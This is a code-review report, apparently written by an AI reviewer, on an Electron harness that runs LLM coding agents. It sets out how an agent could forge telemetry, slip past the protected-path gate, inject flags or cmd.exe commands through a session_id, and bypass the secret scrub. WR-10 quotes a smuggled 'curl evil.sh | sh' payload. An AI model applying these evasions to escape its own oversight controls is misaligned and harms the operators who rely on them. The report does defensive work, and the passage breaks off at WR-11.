---
phase: 01-finish-the-floor
slice: a-main (MAIN-PROCESS / SHARED / PRELOAD)
reviewed: 2026-08-21T00:00:00Z
depth: deep
files_reviewed: 16
files_reviewed_list:
  - src/main/breaker.ts
  - src/main/db.ts
  - src/main/delivery.ts
  - src/main/hive.ts
  - src/main/hooks.ts
  - src/main/index.ts
  - src/main/knowledge.ts
  - src/main/memory.ts
  - src/main/nodeInstall.ts
  - src/main/pty.ts
  - src/main/slack.ts
  - src/main/telemetry.ts
  - src/preload/index.ts
  - src/shared/providerAutomation.ts
  - src/shared/queueDelivery.ts
  - src/shared/releaseDrop.ts
findings:
  critical: 7
  warning: 11
  info: 4
  total: 22
status: issues_found
---

# Phase 01 — Code Review Report, slice A (main / shared / preload)

**Reviewed:** 2026-08-21
**Depth:** deep (cross-file: hook socket → hive → breaker → pty → argv; OTLP → breaker → account pool; queue → disk)
**Files Reviewed:** 16
**Status:** issues_found

## Summary

GATE-01's hook-socket work is sound *on the socket it covers*: identity is derived from a
`Map<token, agentId>`, `payload.agent_id` is genuinely never read, minting is at the one PTY choke
point, and revocation is token-exact on the three PTY teardown paths. The `redactSecrets` battery,
the FTS5 `MATCH` construction, the Slack HMAC, and the `sandbox=""`+CSP release-drop frame all hold
up under adversarial reading.

What does not hold up is the *perimeter around* that work. The floor has a **second, entirely
unauthenticated identity channel** — the OTLP collector on loopback — that accepts `agent.id` and
`session.id` off the payload and feeds the breaker, the account pool and the `--resume` key. It is
the exact trust model GATE-01 deleted from the hook socket, still live one file over, and any agent
can reach it because the endpoint is in its own env (CR-01). Below that: the proxy sidecar's token is
revoked by agent id in the dying child's exit handler, so a qwen/crush restart dead-hooks its own
replacement (CR-02); the PreToolUse path gate resolves relative targets against *main's* cwd and so
misses `../../bin/cth-hook.cjs` entirely (CR-03); the new budget arm's 80–100% band `return`s ahead
of the floor-wide cost cap and pins the level at `steering`, so it *weakened* the ceiling it was
added to strengthen (CR-04); the delivery queue overwrites a good file with an empty list after a
transient read error, contradicting its own comment (CR-05); and an unvalidated hook-supplied
`session_id` reaches argv on the non-Claude resume path, which on Windows is a `cmd.exe` string whose
quoting this repo's own header documents as broken (CR-07).

Cross-cutting theme worth naming: **identity was hardened, accounting keys were not.** `session_id`
is attacker-chosen on every path that reads it (hook payload, OTLP attribute), and
`telemetry.sessions` is keyed by session id alone — so per-agent tokens do not stop one agent from
inflating a sibling's spend until an agent's usage is bound to the *token*, not to the id in the
payload.

---

## Narrative Findings (AI reviewer)

## Critical Issues

### CR-01: The OTLP collector is an unauthenticated second identity channel — it re-opens exactly what GATE-01 closed

**File:** `src/main/telemetry.ts:314-448`, wired at `src/main/index.ts:403`, `:435`, `:1613-1622`

**Issue:** `handleRequest` performs **no authentication of any kind** — no token, no HMAC, no origin
check. `ingestMetrics` (`:350-386`) and `ingestLogs` (`:391-428`) then take the caller's word for
`agent.id` and `session.id`:

```ts
const agentId = str(attrs['agent.id']) || str(resAttrs['agent.id']);
const sessionId = str(attrs['session.id']);
if (!agentId || !sessionId) continue;
const accum = this.session(agentId, sessionId);
```

The header at `:28-30` claims *"Transport posture mirrors `slack.ts`: the local handler bound to
127.0.0.1 is the security boundary"* — but `slack.ts:309-322` verifies an HMAC over the raw body plus
a replay window on top of the bind. This has the bind and nothing else, and the bind is not a
boundary against the threat model this app has: the attacker is an LLM-driven shell **on the same
machine, as the same uid**, and `hive.ts` injects `OTEL_EXPORTER_OTLP_ENDPOINT` into that shell's own
environment.

Three concrete failure scenarios, all one `curl` from any agent's Bash tool:

1. **Breaker DoS against a sibling.** POST a `claude_code.token.usage` metric with
   `agent.id: "<victim>"`, `type: "output"`, `asInt: 5e9`. `aggregateLive` folds it into the
   victim's sample; the next `runBreakerBeat` (`index.ts:1614`) hands it to `breaker.tick`, which
   trips the per-agent cap (`breaker.ts:369`), the floor token cap (`:377`) or the velocity arm
   (`:390`). The victim is steered, then `constrained` — told to stop all active work — and with
   `hardStop: true` its PTY is killed and torn down (`index.ts:1652-1655`).
2. **Killing a Claude account for the whole floor.** POST a log record with
   `event.name: "api_error"`, `status_code: 401`, `agent.id: "<victim>"`. `onApiError`
   (`index.ts:435`) hands it to `accountPool.handleApiError`, which at `accountPool.ts:212` acts on
   exactly 429/401 and marks the account cooling/dead — force-respawning **every** agent pinned to
   it.
3. **Choosing another agent's `--resume` key.** `index.ts:1622` does
   `if (sample?.sessionId) hive.recordSession(id, sample.sessionId)`. A forged metric names both the
   agent and the session id, so the attacker writes the victim's registry resume key. See CR-07 for
   what that key then reaches.

The port is ephemeral but not secret: it is in the attacker's own env, in `fleet.json`'s
neighbourhood, and one `netstat`/`ss` away.

**Fix:** Mint the same per-agent capability GATE-01 already has and require it on this listener, then
DERIVE the agent id from it exactly as `hooks.ts:395-412` does — do not read `agent.id` off the
payload at all:

```ts
// telemetry.ts — reuse HookServer's registry rather than inventing a second one.
constructor(opts) { … this.resolveToken = opts.resolveToken; }

private handleRequest(req, res) {
  const agentId = this.resolveToken?.(String(req.headers['x-hive-token'] ?? ''));
  if (!agentId) { res.writeHead(401); res.end(); return; }   // fail closed, log throttled
  … // and pass `agentId` down into ingestMetrics/ingestLogs, ignoring attrs['agent.id']
}
```

and in `hive.ts` `ensureAgent`, export the endpoint with that agent's token appended
(`OTEL_EXPORTER_OTLP_HEADERS=x-hive-token=<token>`, which Claude Code already supports). Until that
lands, no document may describe the floor as "identity is derived, never claimed" — it is derived on
one of two channels.

---

### CR-02: A qwen/crush restart revokes the token it just minted — every proxy agent is dead-hooked from its second spawn onward

**File:** `src/main/hive.ts:1336-1340` (with `:719-735`, `:1285-1293`)

**Issue:** `revokeProxyToken(agentId)` is keyed by **agent id**, and the old child's exit handler
calls it **unconditionally** — the identity guard covers only the map delete on the line above:

```ts
child.on('exit', () => {
  if (this.proxyChildren.get(agentId) === child) this.proxyChildren.delete(agentId); // guarded
  this.revokeProxyToken(agentId);   // NOT guarded — revokes whatever token is current
  settle(0);
});
```

`revokeProxyToken` reads `proxyTokens.get(agentId)` — i.e. the **live** token — so the dying
sidecar's exit revokes the **replacement's** credential. This is not a narrow race; it is the normal
ordering. `startProxyBridge` (`:1285-1293`) runs `stopProxyBridge` → `child.kill()` (exit event is
asynchronous) → `mintProxyToken` → `spawn` → `proxyChildren.set(new)`, all synchronously in one tick.
The old child's `exit` therefore lands *after* the new token is in `proxyTokens`, every time.

Result: on any restart of a proxy-tier agent (model change, `Restart & Continue`, account failover),
the new sidecar posts `sock_token: <revoked>`, `authorized()` drops it (`hooks.ts:395-412`), and that
agent has no live status, no `Stop`→drain, and **no cost rows** — so `budgetForAgent` and every
breaker arm are blind to it. Silent: the only symptom is the throttled reject line, which blames "the
PTY env" rather than the revoke.

Worse, `hive.ts:726-728` claims the opposite in a comment — *"Revoke token-exact, never by agent: a
sidecar restart is stop()+start() under the same id"* — so the defect reads as fixed.

**Fix:** capture the token in the spawn closure and revoke exactly it, the way `pty.ts:400-405` does:

```ts
const token = this.mintProxyToken(agentId);
…
child.on('exit', () => {
  if (this.proxyChildren.get(agentId) === child) this.proxyChildren.delete(agentId);
  if (this.proxyTokens.get(agentId) === token) this.proxyTokens.delete(agentId);
  try { if (token) this.hookTokenSource?.revoke(token); } catch { /* teardown */ }
  settle(0);
});
```

Add a regression that spawns, restarts, and asserts the *replacement's* token still resolves — no
current test drives two sidecar generations.

---

### CR-03: The PreToolUse protected-path gate resolves relative targets against MAIN's cwd, so any relative path walks past it

**File:** `src/main/hooks.ts:434-461` (`protectedPathDenial`), `:484-517` (`denyReason`), `:126-138`
(`realResolve`)

**Issue:** every candidate target — the `file_path`/`path`/`notebook_path` fields and every shell
word of a `Bash` command — is handed to `realResolve(target)`, whose first line is
`const abs = resolve(p)`. `path.resolve` on a relative path resolves against **`process.cwd()` of the
Electron main process**, not the agent's. `HookPayload.cwd` is declared at `:97` and is never used
here.

So with an agent whose cwd is `<hive>/agents/a-1` (the shipped default):

| tool_input | resolves to | gate |
|---|---|---|
| `Bash: cat >> "$HIVE_ROOT/bin/cth-hook.cjs"` | `<hive>/bin/cth-hook.cjs` | **deny** (tested) |
| `Bash: cd $HIVE_ROOT && cat >> bin/cth-hook.cjs` | `<electron cwd>/bin/cth-hook.cjs` | **allow** |
| `Write file_path: "../../bin/cth-hook.cjs"` | `<electron cwd>/../../bin/…` | **allow** |
| `Write file_path: "../b-1/settings.json"` | `<electron cwd>/../b-1/…` | **allow** |

The first row is the only shape the nine acceptance cases in `test/net-binding.test.cjs` exercise —
all nine pass absolute paths or the `$HIVE_ROOT` literal. The gate's stated ceiling (`:427-432`) names
runtime path assembly and hookless engines; it does not name relative paths, and `01-02-SUMMARY.md`
must_have #8 claims the gate holds for every engine that routes through PreToolUse. It does not.

**Fix:** resolve relative targets against a cwd main can vouch for — the agent's registry cwd, never
`payload.cwd` (attacker-controlled) — and deny a relative target outright when no cwd is known:

```ts
private denyReason(agentId: string, root: string, target: string): string | null {
  const base = this.hive.registry().agents[agentId]?.cwd;
  if (!isAbsolute(target)) {
    if (!base) return 'Denied: relative path with no resolvable working directory.';
    target = join(base, target);
  }
  const t = realResolve(target);
  …
```

Add a tenth case to `test/net-binding.test.cjs`: agent `a-1` in `<root>/agents/a-1` writing
`../../bin/cth-hook.cjs` must be denied.

---

### CR-04: The budget arm's 80–100% band masks the floor-wide cost cap — the ceiling it was added to enforce got weaker

**File:** `src/main/breaker.ts:358-365` (with `:287-301`)

**Issue:** `evaluate()` returns on the first matching arm. The FLOOR-10 budget arm sits **above** the
per-agent cap, the floor `costCapUsd` cap, the floor token cap, the velocity arm and the no-progress
arm — and its lower band returns `{ tripping: true, ceiling: 'steering' }`. Two consequences compound:

1. **Every arm below it is skipped** for as long as the card sits in 80–100%.
2. `ceiling: 'steering'` clamps the ladder at rank 1 (`:298`), and because `trip.tripping` is true the
   recovery branch never runs — the agent is **pinned at `steering` indefinitely**.

Scenario: agent A's card is at 85% of a 500k cap, and A is simultaneously the biggest spender on a
floor whose total is over `costCapUsd`. `tick()` correctly computes `topSpender === 'A'` at
`:255-263`, but `evaluate` returns at `:364` before reaching `:373`. A stays `steering` — it keeps
spending, is never `constrained`, and the operator sees a card-budget reason instead of the cost-cap
reason. Before FLOOR-10 landed, that same agent reached `constrained` on the next beat.

The doc at `:341-344` reasons only about which `reason` string the operator reads; it does not
account for the early return suppressing *enforcement*.

**Fix:** make the soft band advisory rather than terminal — evaluate it, remember it, and keep going:

```ts
let soft: { reason: string; ceiling: BreakerLevel } | null = null;
const budget = input.budget;
if (budget && budget.cap > 0 && budget.tokens >= budget.cap * BUDGET_STEER_FRACTION) {
  if (budget.tokens > budget.cap) return { tripping: true, reason: `over budget: …` };
  soft = { reason: `budget: card …`, ceiling: 'steering' };   // do NOT return
}
// … per-agent cap, cost cap, token cap, velocity, no-progress …
return soft ? { tripping: true, ...soft } : { tripping: false, reason: '' };
```

`test/breaker.test.cjs` needs the case "an 85%-of-cap card that is also the top spender over the
floor cost cap still reaches constrained".

---

### CR-05: A transient read error silently empties the persisted delivery queue and then writes the emptiness back

**File:** `src/main/delivery.ts:371-384` (with `:388-402`)

**Issue:** the doc comment at `:366-370` states the invariant — *"because a load failure must not then
be written back over a file that might be fine, `queueFile` is only armed once a load has actually
landed"* — and the code does not implement it. `this.queueFile = path` at `:382` runs on **every**
path, including after the `catch` swallowed the failure:

```ts
try {
  const parsed: unknown = JSON.parse(readFileSync(path, 'utf8'));
  …
} catch { /* absent or corrupt — an empty queue, not a crashed tick */ }
this.queue = items;      // [] on ANY failure
this.queueFile = path;   // armed regardless → saveQueue() will now write []
```

"Absent" and "unreadable" are conflated. Concrete loss: `delivery-queue.json` holds 20 parked
messages; a tick's `readFileSync` throws `EBUSY`/`EPERM` (Windows AV or an indexer holding the file —
this repo's own memory notes record exactly that class of stall) or `EMFILE` under load. `loadQueue`
returns `[]` and arms the path. The very next mutation — an `enqueue`, a `remove`, or `deliverQueued`'s
acknowledge callback (`:551-556`) — calls `commitQueue()` → `saveQueue()` → `writeFileSync(tmp,
JSON.stringify({version:1, items: []}))` → `renameSync`. The 20 messages are gone from disk, from
memory, and from the renderer's pushed snapshot, with no log line: the `catch` is silent and
`saveQueue` only logs on *write* failure.

The same path also silently drops any row that fails `isQueuedDelivery` (`:238-246`) — a shape change
to `QueuedDelivery` deletes every persisted row on the first launch after upgrade.

**Fix:** distinguish "no file" from "cannot read", and refuse to arm on the failure branch:

```ts
let items: QueuedDelivery[] = [];
try {
  const parsed = JSON.parse(readFileSync(path, 'utf8'));
  const raw = (parsed as { items?: unknown })?.items;
  if (Array.isArray(raw)) items = raw.filter(isQueuedDelivery);
} catch (e) {
  if ((e as NodeJS.ErrnoException).code !== 'ENOENT') {
    this.log('queue unreadable — refusing to overwrite it', String(e));
    this.queue = null; this.queueFile = null;   // stay disarmed; retry next tick
    return [];
  }
}
this.queue = items;
this.queueFile = path;
```

`test/delivery-main.test.cjs` covers no unreadable/corrupt-file case at all — add one that chmods or
replaces the file with garbage and asserts the on-disk bytes survive a subsequent `enqueue`.

---

### CR-06: An agent's own hook token lets it write another agent's cost accumulator, because the accounting key is still claimed

**File:** `src/main/telemetry.ts:438-448` (`session()`), reached from `src/main/hooks.ts:597-621`

**Issue:** `sessions` is keyed by **session id alone**:

```ts
private session(agentId: string, sessionId: string): SessionAccum {
  let accum = this.sessions.get(sessionId);          // agentId is NOT part of the key
  if (!accum) { accum = { agentId, … }; this.sessions.set(sessionId, accum); }
  let set = this.agentSessions.get(agentId); … set.add(sessionId);
  return accum;
}
```

GATE-01 derives *who is calling* but nothing constrains *what session id they name*. The `CostSample`
branch at `hooks.ts:597-618` passes `p.session_id` straight through. So agent A, holding only its own
legitimately minted token, posts:

```json
{"hook_event_name":"CostSample","sock_token":"<A's own>","session_id":"<B's session>","output":2000000000}
```

`recordCostSample` resolves the **existing** accumulator (created by B, `accum.agentId === 'B'`) and
adds A's numbers to it. `agentSessions['A']` now also contains B's session, so `aggregateLive('A')`
and `aggregateLive('B')` both sum it — B's breaker sample inflates and B is steered → constrained,
and A's does too. B's session id is not a secret: it is in `fleet.json`, in `registry.json`, and in
the hive log's `{kind:'session'}` rows, all of which agents are told to read.

This survives a fix for CR-01 — it is reachable on the *authenticated* channel — which is why it is
its own finding.

**Fix:** key the accumulator by the pair, and reject a sample whose session belongs to another agent:

```ts
private session(agentId: string, sessionId: string): SessionAccum {
  const key = `${agentId} ${sessionId}`;
  let accum = this.sessions.get(key);
  …
}
```

(`aggregateLive` and `forget` already iterate `agentSessions`, so they need only the key change.)
Note `hive.applyCostRow` already uses exactly this composite key (`hive.ts:2840`) — the two halves of
the cost path disagree today.

---

### CR-07: A hook-supplied `session_id` reaches argv unvalidated on the non-Claude resume path — flag injection everywhere, `cmd.exe` injection on Windows

**File:** `src/main/hooks.ts:565` → `src/main/hive.ts:1143-1156` → `src/main/index.ts:3290-3293`
(with `src/main/pty.ts:132-144`)

**Issue:** `hooks.ts:565` accepts any truthy `p.session_id` and `recordSession` persists it to
`registry.json` with no shape check. The Claude branch is guarded — `seedSessionTranscript` refuses
anything outside `/^[A-Za-z0-9_-]+$/` (`transcript.ts:73-77`) before `--resume` is attached. **The
generic branch has no guard at all:**

```ts
const sid = typedSid || (opts.resume === true ? hive.lastSession(opts.hive.id) : undefined);
if (sid && rf) {
  const args = opts.args ?? [];
  if (!args.includes(rf)) { args.push(rf, sid); opts.args = args; didResume = true; }
}
```

An agent posts one hook payload with its **own valid token** and
`session_id: "--dangerously-skip-permissions"` (or any engine flag), and its next restart launches
its CLI with that flag. On Windows the same argv goes through `buildCmdCommandLine`
(`pty.ts:132-144`) whenever the engine is not a `.exe` and the npm shim cannot be decoded — the
documented, reachable fallback (`pty.ts:743-757` warns about it in production). `quoteToken` escapes
`"` as `\"`, and this file's own header (`pty.ts:105-112`) states plainly why that does not work:

> **cmd.exe has NO backslash escape** … `\"` does not embed a quote — it closes (or opens) the quoted
> run and dumps everything after it back into bare, metacharacter-interpreting context.

So `session_id: 'x" & <command> & "'` breaks out of the quoted run and cmd.exe executes `<command>` —
**outside** the agent's PreToolUse gate, outside `AGENT_DENY_RULES`, at PTY spawn time. That is a
direct escape from the tool-gating boundary CR-03 and GATE-01 exist to hold, reachable from a hook
payload the agent is authorised to send.

**Fix:** validate at the sink where every producer converges, and reuse the existing constant rather
than a second copy:

```ts
// transcript.ts — export the pattern that already exists there.
export const VALID_SESSION_ID = /^[A-Za-z0-9_-]{1,128}$/;

// hooks.ts:565
if (agentId && typeof p.session_id === 'string' && VALID_SESSION_ID.test(p.session_id)) {
  this.hive.recordSession(agentId, p.session_id);
}
// hive.ts recordSession — same test, because index.ts:1622 is a second producer.
// index.ts:3291 — refuse rather than attach: if (!VALID_SESSION_ID.test(sid)) { …warn; skip }
```

The same `typeof` gap applies to `p.model` (`hooks.ts:611-617`) and `p.transcript_path`
(`hooks.ts:521-523`): `HookPayload`'s TypeScript types are assertions about `JSON.parse` output, not
checks.

---

## Warnings

### WR-01: The hook connection handler never consumes its buffer — one payload is handled twice, and the buffer is unbounded

**File:** `src/main/hooks.ts:246-263`

**Issue:** `buf` is appended to and read with `indexOf('\n')`, but never sliced past the consumed
line, and nothing marks the connection as done. `conn.end()` half-closes the writable side only; the
readable side stays open until the *peer* closes. Verified empirically against the exact handler
shape: with a client that sets `allowHalfOpen: true` (fully attacker-controlled), a single trailing
byte re-runs `handle()` on the **same** payload:

```
handle() #1 line="{\"a\":1}"
client writes x
handle() #2 line="{\"a\":1}"        ← same line, second time
server conn error: ERR_STREAM_WRITE_AFTER_END   ← swallowed by conn.on('error')
```

Every side effect doubles for one authenticated payload: `recordCost` (a doubled cost sample),
`breaker.recordToolUse` (a doubled repeat count, one step closer to a loop trip), `drainAtStop` (a
second cursor advance and a second continuation), and `notify` (two toasts). It also fires on
non-malicious clients that chunk their write.

Separately, `buf` has **no size cap and no idle timeout** — a peer that writes without ever sending a
newline grows main-process memory without bound. `slack.ts:105` and `telemetry.ts:129` both cap their
bodies; the more sensitive socket does not.

**Fix:**

```ts
const server = createServer((conn) => {
  let buf = '';
  let done = false;
  conn.setTimeout(10_000, () => conn.destroy());
  conn.on('data', (d) => {
    if (done) return;
    buf += d.toString();
    if (buf.length > MAX_HOOK_LINE_BYTES) { done = true; conn.destroy(); return; }
    const nl = buf.indexOf('\n');
    if (nl === -1) return;
    done = true;
    const line = buf.slice(0, nl);
    …
    conn.end(JSON.stringify(res ?? {}));
  });
```

### WR-02: The protected set omits `registry.json` — the file that decides where every agent's engine is spawned

**File:** `src/main/hooks.ts:484-516`

**Issue:** `denyReason` protects `<hive>/bin`, `<hive>/.git`, the socket, and
`<hive>/agents/<other>`. It does **not** protect the hive root's own control files —
`registry.json`, `tasks.json`, `fleet.json` — and an agent's own directory is explicitly allowed, so
nothing else stands in front of them.

`registry.json` is the highest-value file in the hive: `index.ts` reads it for each agent's `cwd`,
`provider`, `account` and `sessionId` at spawn. Concrete chain: agent A writes
`<hive>/registry.json` (allowed by the gate) setting agent B's `cwd` to `$HOME`; B's next spawn runs
its engine there with `--permission-mode bypassPermissions` (`hive.ts:AGENT_DENY_RULES` header). The
same write also widens `managedRoots()` (`index.ts:3868-3889`, which pushes every registry `cwd`), so
every `fs:*`/`git:*` IPC handler now accepts `$HOME` as an in-contract root.

`tasks.json` is the budget ledger the new FLOOR-10 arm reads its caps from (`hive.ts:2925-2932`); a
direct write raises any card's `budgetTokens` past the arm.

**Fix:** add the hive root's own state files to the protected set, allowing writes only through the
harness's own APIs (`bin/task.cjs` already exists for `tasks.json`):

```ts
const HIVE_STATE_FILES = ['registry.json', 'tasks.json', 'fleet.json', 'cursor.json'];
for (const f of HIVE_STATE_FILES) {
  if (within(join(hiveRoot, f), t)) {
    return `Denied: <hive>/${f} is harness state — it decides where agents are spawned and what `
      + 'their budgets are. Use bin/task.cjs or ask god; do not edit it directly.';
  }
}
```

### WR-03: `PtyManager.kill()` leaves the session in the map and the hook token live when `proc.kill()` throws

**File:** `src/main/pty.ts:832-845`

**Issue:** `this.sessions.delete(id)` and `this.releaseHookToken(s)` sit **inside** the `try`, after
`s.proc.kill()`. If the kill throws (child already reaped — the case `killByOwner` at `:360-378`
explicitly documents and handles: *"when the kill above throws (child already reaped) onExit never
fires, so the dead session lingers forever"*), the catch returns `{ok:false}` and:

- the phantom session stays in the map, so the respawn is refused with `pty already exists for id`
  (`:583`) — the operator cannot restart that agent without quitting the app; and
- its hook token is never revoked, so it keeps resolving in `HookServer.tokens` for the life of the
  process.

**Fix:** mirror `killByOwner` — unconditional teardown:

```ts
kill(id: string): { ok: boolean; error?: string } {
  const s = this.sessions.get(id);
  if (!s) return { ok: false, error: `no pty: ${id}` };
  let err: string | undefined;
  try { const pid = s.proc.pid; s.proc.kill(); ensureKilled(pid); }
  catch (e) { err = e instanceof Error ? e.message : String(e); }
  this.sessions.delete(id);      // always
  this.releaseHookToken(s);      // always
  return err ? { ok: false, error: err } : { ok: true };
}
```

### WR-04: The corrupt-DB quarantine cannot work — the failed handle is never closed

**File:** `src/main/db.ts:119-146`

**Issue:** `openOnce` constructs `new Database(path)` and only then runs the pragmas and `migrate`.
When any of those throw — which is exactly how `SQLITE_NOTADB` surfaces — the exception propagates
**with the handle still open**; there is no `try/finally` and no `db.close()`. `open()` then calls
`quarantine(path)`, which does `renameSync` on a file this process still holds open. On Windows that
fails with `EPERM`/`EBUSY` (SQLite does not open with `FILE_SHARE_DELETE`), `quarantine` throws, and
`open()` throws — so the store is never recreated and stays closed for the life of the install. That
is precisely the outcome the comment at `:125-128` says this branch exists to prevent
(*"the app would look perfectly healthy while silently persisting NOTHING"*). On POSIX the rename
succeeds but the handle still leaks.

No test exercises the quarantine path (`test/db-fts.test.cjs` has no corruption case).

**Fix:**

```ts
private openOnce(path: string): Database.Database {
  const db = new Database(path);
  try {
    db.pragma('journal_mode = WAL');
    …
    this.migrate(db);
    return db;
  } catch (e) {
    try { db.close(); } catch { /* already dead */ }
    throw e;
  }
}
```

### WR-05: Migration 2 can throw, and a throw here takes `kv` and `command_history` down with it — permanently

**File:** `src/main/db.ts:95-106`, `:148-159`

**Issue:** the comment says *"No `throw` in here"*, but `db.exec` throws on any SQLite build without
the FTS5 module (`no such module: fts5`) and on the older grammar the comment itself names as
rejecting `IF NOT EXISTS` on `CREATE VIRTUAL TABLE`. `isCorruptDb` (`:280-285`) matches neither, so
`open()` rethrows (`:131`) and the whole store — window bounds, command history, the memory index —
is unavailable. Because the migration and its `user_version` bump share one transaction (`:153-156`),
the rollback leaves `user_version` at 1, so every subsequent launch repeats the same failure forever.

Nothing tests the real upgrade path either: `test/db-fts.test.cjs:85` only opens a **fresh** DB.
An existing install at `user_version = 1` executes this migration for the first time in production.

**Fix:** make the FTS index optional rather than load-bearing on open, and cover the upgrade:

```ts
(db) => {
  try {
    db.exec(`CREATE VIRTUAL TABLE IF NOT EXISTS memory_fts USING fts5(…);`);
  } catch (e) {
    console.error('[db] FTS5 unavailable — keyword recall is off, the rest of the store is fine:', e);
  }
}
```

plus a test that opens a v1 DB (kv + command_history populated), reopens through `PersistStore`, and
asserts both `user_version === 2` and that the pre-existing rows survived.

### WR-06: The `'agent'` memory scope is unreachable — the documented isolation option cannot be turned on

**File:** `src/main/memory.ts:65-75`, `:252`, and `src/main/index.ts:560-563`

**Issue:** `MemoryManager`'s settings thunk is constructed as
`{ enabled: c.semanticMemory !== false, model: c.embeddingModel ?? 'minilm' }` — **no `scope` key** —
and `HarnessConfig` (`src/main/config.ts:217-219`) has no scope field at all. So
`scope()` (`memory.ts:252`) returns `'shared'` unconditionally, and every isolation branch is dead
code: `palacePath`'s per-agent arm (`:238-241`), `keywordSearch`'s refusal (`:461-463`),
`runCli`'s refusal (`:483-486`), `status()`'s `palaces` root (`:256`), and `safeAgentSegment`
(`:99-105`) in its entirety. `MemoryPanel.tsx:113` branches on `status?.scope !== 'agent'`, which is
always true.

That matters because the file's own header (`:10-21`) states the exposure the option exists to close:
*"An agent handed a credential, a customer name, or a private instruction writes it to memory.md, the
miner indexes it, and any sibling can surface it with one `mempalace search`."* The mitigation is
documented and unavailable.

**Fix:** either wire it (`scope: c.memoryScope ?? 'shared'` plus the config field and a Settings
control), or delete the branch and the header's two-option prose so the code and the doc agree that
`'shared'` is the only model. Do not leave a security option that reads as configurable and is not.

### WR-07: The secret scrub's size caps are a bypass the agent controls

**File:** `src/main/hive.ts:3196-3226`

**Issue:** two size ceilings both resolve to **commit unscanned**:

```ts
if (changed > SECRET_SCAN_MAX_LINES) { …console.warn('committing UNSCANNED'); return true; }
…
const text = diff.out.slice(0, SECRET_SCAN_MAX_BYTES);   // remainder is committed, never scanned
```

`SECRET_SCAN_MAX_LINES` is 20 000 and `SECRET_SCAN_MAX_BYTES` is 4 MB (`:321`, `:326`). An agent that
wants a credential in the durable, replicated git history writes it alongside a 20 001-line file — one
`seq 1 20001 > filler.txt` in its own directory, which nothing denies. The scrub then returns `true`
and `flushCommit` commits everything. Both branches log, but they log to `console.warn` and the hive
log, not to any operator surface.

The `WHAT IT DOES NOT CATCH` block (`:3168-3177`) enumerates *credential shapes* and does not mention
the size escape, so the stated ceiling is narrower than the real one.

**Fix:** treat over-cap as unsafe, not as safe: scan per-file (`git diff --cached --numstat` already
gives per-path counts) and unstage only the paths that individually exceed the cap, rather than
waving the whole commit through. At minimum, invert the default —
`return false` on over-cap and let the operator resolve it — and add the size escape to the
`WHAT IT DOES NOT CATCH` list and to `test/hive-durability.test.cjs`'s ceiling test.

### WR-08: The scrub never verifies that the path it "unstaged" actually left the index

**File:** `src/main/hive.ts:3134-3147` (`unstagePath`), `:3239-3254`

**Issue:** two gaps in the round-trip from the diff header back to a pathspec:

1. **`--ignore-unmatch` cannot report a miss.** `git rm --cached -q --ignore-unmatch -- <rel>` exits
   `0` whether it removed the path or matched nothing at all, so `unstagePath` returns `true` in both
   cases. `scrubStagedSecrets` then logs `secret-scrubbed`, leaves `safe = true`, and `flushCommit`
   commits. Nothing re-reads `git diff --cached --name-only` to confirm.
2. **A C-quoted path is not recognised at all.** `core.quotePath=false` only stops *high bytes* from
   being quoted; git still C-quotes a path containing `"`, `\` or a control character. On POSIX those
   are legal filenames an agent can create inside its own directory. The header line is then
   `+++ "b/a\"b.md"`, the regex `/^\+\+\+ b\/(.+)$/m` does not match, `rel` is `null`, and the branch
   at `:3242-3247` sets `safe = false` — so **`flushCommit` returns without committing, on this and
   every future flush**, because the next `add -A` re-stages the same file. One file wedges the hive's
   entire git history permanently, announced only by a `console.warn`.

**Fix:** use literal pathspec magic and verify the outcome:

```ts
private async unstagePath(root: string, rel: string): Promise<boolean> {
  const spec = `:(literal)${rel}`;
  const restored = await this.gitAsync(['restore', '--staged', '--', spec], root);
  if (!restored.ok) await this.gitAsync(['rm', '--cached', '-q', '--ignore-unmatch', '--', spec], root);
  // Trust nothing: the path must be gone from the index.
  const still = await this.gitAsync(['diff', '--cached', '--name-only', '--', spec], root);
  return still.ok && !still.out.trim();
}
```

and unquote a C-quoted `+++ "b/…"` header (or fall back to `git diff --cached --name-only -z`, which
never quotes) instead of failing closed forever.

### WR-09: `knowledge.remove()` forwards an unvalidated renderer id into a recursive `rmSync`

**File:** `src/main/knowledge.ts:135-141` (sink: `src/main/kg-core.cjs:472-489`, IPC:
`src/main/index.ts:4241-4242`, bridge: `src/preload/index.ts:855`)

**Issue:** `remove(docId)` and `get(docId)` pass the id straight through. The core does:

```js
const docDir = path.join(kgRoot, 'docs', String(docId || ''));
if (!docId || !fs.existsSync(docDir)) return false;
fs.rmSync(docDir, { recursive: true, force: true });
```

`path.join` normalises `..`, so `kg:remove('../../..')` resolves outside the store and recursively
force-deletes it; `kg:get('../../../.ssh')` reads outside it. The IPC handler checks only
`typeof id === 'string' && id`. Every other filesystem handler in this file is behind `managedRoot`
(`index.ts:3891-3928`); these two are not.

**Fix:** constrain the id at the façade, where the store's own id format is known
(`kg-core.cjs:341` mints them with `genId()`):

```ts
private static readonly DOC_ID = /^[A-Za-z0-9_-]{1,64}$/;
remove(docId: string): boolean {
  if (!KnowledgeManager.DOC_ID.test(docId)) return false;
  return core.removeDoc(this.root(), docId);
}
get(docId: string): { meta: KgMeta; text: string } | null {
  if (!KnowledgeManager.DOC_ID.test(docId)) return null;
  return core.getDoc(this.root(), docId);
}
```

### WR-10: A remote JSON field is interpolated unvalidated into a script that runs `sudo`/`msiexec`

**File:** `src/main/nodeInstall.ts:140-165`, `:174-231`

**Issue:** `resolveNodeInstaller` takes `lts.version` verbatim out of `nodejs.org/dist/index.json` and
feeds it to `nodeArtifactFor` and `distUrl` with no shape check. `buildNodeInstallScript` then
interpolates the resulting `version`, `file` and `url` into a shell/cmd script that is executed via
`$SHELL -lc` (or `cmd.exe /d /s /c`) and that calls `sudo installer`, `sudo tar` or `msiexec`. Only
`sha256` is validated (`shaFor`'s `/^([0-9a-f]{64})\s+(\S+)\s*$/` at `:116`).

A hostile or compromised `index.json` — the file header itself justifies the checksum by saying *"we
run an installer as root"* — carrying `"version": "v24.0.0; curl evil.sh | sh; #"` produces
`curl -fSL https://nodejs.org/dist/v24.0.0; curl evil.sh | sh; #/node-….tar.xz -o …`, and the injected
command runs **before and independently of** the checksum gate the file's threat model rests on.

**Fix:** one regex, at the boundary:

```ts
const VALID_NODE_VERSION = /^v\d+\.\d+\.\d+$/;
const lts = pickLatestLts(index);
if (!lts || !VALID_NODE_VERSION.test(lts.version)) return null;
```

and assert the same for the derived `file` before it reaches `buildNodeInstallScript`.
`test/node-install.test.cjs` should carry a "malicious index.json is refused" case.

### WR-11: The scrub failure mode is a permanent, silent stop on the hive's durability path

